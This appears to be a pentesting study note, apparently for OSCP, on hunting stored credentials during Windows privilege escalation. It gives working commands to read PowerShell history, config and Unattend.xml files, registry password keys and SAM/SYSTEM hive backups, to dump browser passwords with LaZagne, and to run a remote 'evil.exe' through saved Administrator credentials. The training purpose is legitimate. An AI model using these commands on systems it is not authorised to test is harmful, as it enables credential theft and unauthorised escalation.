# Introduction to Sensitive Credentials

> **Context:** Windows Privilege Escalation → Sensitive Credentials
> **Why it matters:** Credentials are the most common vector for lateral movement and privilege escalation in real-world engagements. Unlike misconfigurations that must be explicitly set, credentials accumulate passively through normal system use.

---

## Core Principle

> [!IMPORTANT]
> OS and applications often store **clear-text, encoded, or hashed** credentials on disk or in memory. If you find any password after initial access, **try it everywhere** — password reuse is extremely common (password spraying).

---

## Common Credential Locations

| Location | What to Look For |
|----------|-----------------|
| Configuration Files | Database creds, API keys, connection strings |
| PowerShell History | Commands containing passwords typed at the prompt |
| Credential Manager (CredMan) | RDP, network share, and application credentials |
| Registry Keys | AutoLogon passwords, PuTTY/VNC/SNMP creds |
| SAM / SYSTEM Hives | Local account NTLM password hashes |
| Browser Saved Passwords | Stored login credentials (extracted via LaZagne) |
| Unattended Installation Files | Admin passwords in `Unattend.xml` / `sysprep.xml` |
| Hidden Files | Files hidden via Windows attributes (similar to Linux dot-files or ADS) |

---

## 1. Configuration Files (e.g., IIS)

Configuration files store application and server settings, sometimes including usernames, passwords, and connection strings.

**Example — IIS `web.config`:**

```cmd
type C:\inetpub\wwwroot\web.config
type C:\inetpub\wwwroot\connectionstrings.config
```

**Search for config files in web server directories:**

```powershell
Get-Childitem -Recurse C:\apache | findstr -i "directory config txt php ps1 bat xml pass user"
Get-Childitem -Recurse C:\xampp | findstr -i "directory config txt php ps1 bat xml pass user"
```

## 2. PowerShell History

Every user has a PowerShell (v5+) history file since they first use it (similar to `.bash_history` in Linux).

**Default location:**

```
%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

### Reading History

**From CMD:**

```cmd
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

> [!NOTE]
> `%userprofile%` is a CMD environment variable. In PowerShell, replace it with `$Env:userprofile`.

**From PowerShell (recommended — uses the configured path, even if customized):**

```powershell
cat (Get-PSReadlineOption).HistorySavePath
```

### CMD vs PowerShell Comparison

| Feature | `type %userprofile%\...\ConsoleHost_history.txt` | `cat (Get-PSReadlineOption).HistorySavePath` |
|---------|-------|-------|
| Shell | CMD | PowerShell |
| Path | Hardcoded default path | Retrieved from PSReadLine config |
| Works with custom history path | ❌ No | ✅ Yes |

> [!TIP]
> **PowerShell history only logs PowerShell commands**, not CMD commands. CMD history is session-based and not saved to a persistent file. For OSCP, check both shells separately.

| Where you type | Saved in PowerShell history? |
|----------------|------------------------------|
| PowerShell | ✅ Yes |
| CMD (`cmd.exe`) | ❌ No |
| PowerShell launched from CMD | ✅ Usually (if PSReadLine is active) |

## 3. Hidden Files

Files and folders can be hidden in Windows (similar to ADS and Linux dot-files).

**Show hidden files:**

```cmd
dir /a C:\
```

---

## 4. Password Hunting in Files

### Where to Search

- `C:\Users\<username>`
- `C:\Users`
- `C:\Program Files` / `C:\inetpub` / `C:\temp`

### Find files with password-related names

```cmd
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config* == *user*
```

### Find files with password-related content

```cmd
findstr /SI "passw pwd" *.xml *.ini *.txt *.ps1 *.bat *.config
```

## 5. Stored Credentials (Credential Manager)

Credential Manager acts as a vault to store login credentials for servers and sites.

**List saved credentials:**

```cmd
cmdkey /list
```

**Execute commands as another user with saved creds:**

```cmd
runas /savecred /user:WORKGROUP\Administrator "\\10.10.10.10\SHARE\evil.exe"
```

## 6. Registry Keys

### Broad registry password search

```cmd
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

### Targeted registry queries

| Registry Key | What It Contains |
|--------------|-----------------|
| `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` | AutoLogon creds (`DefaultUserName`, `DefaultDomainName`, `DefaultPassword`) |
| `HKLM\SYSTEM\Current\ControlSet\Services\SNMP` | SNMP community strings |
| `HKCU\Software\SimonTatham\PuTTY\Sessions` | PuTTY proxy credentials |
| `HKCU\Software\ORL\WinVNC3\Password` | VNC password |
| `HKLM\SOFTWARE\RealVNC\WinVNC4` | VNC password |

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
```

> [!NOTE]
> If an administrator has configured AutoLogon, a **plaintext password** may be present in the `Winlogon` registry key. Registry credentials are often exposed because of insecure configuration, not because the registry is designed to store passwords in plaintext.

## 7. Credentials in Browser

Browsers store saved passwords when users accept the "save password" popup.

**LaZagne** — open-source tool to retrieve passwords stored on a local computer:

```cmd
laZagne.exe all
laZagne.exe browsers
laZagne.exe browsers -firefox
```

## 8. SAM / SYSTEM

| Hive | Purpose |
|------|---------|
| `SAM` | Local account information, including NTLM password hashes |
| `SYSTEM` | System configuration; contains the boot key needed to decrypt SAM |

### Default & Backup Locations

```
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\RegBack\system
```

### Search for SAM/SYSTEM backup files

```cmd
cd C:\ & dir /S /B SAM == SYSTEM == SAM.OLD == SYSTEM.OLD == SAM.BAK == SYSTEM.BAK
```

## 9. Unattended Installation

Method used to install Windows non-interactively (without manual intervention). The config file `Unattend.xml` specifies settings for customization. These files require an administrator account for initial setup, **often storing creds in plain text**.

### Common Locations

```
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

### Search for unattended install files

```cmd
dir /s /b | findstr /i "unattend.xml"
```

Or search broadly:

```
*sysprep*.xml, *sysprep*.inf, *unattend*.xml, *unattend*.txt
```

Use RDP or PsExec to login with discovered admin creds.
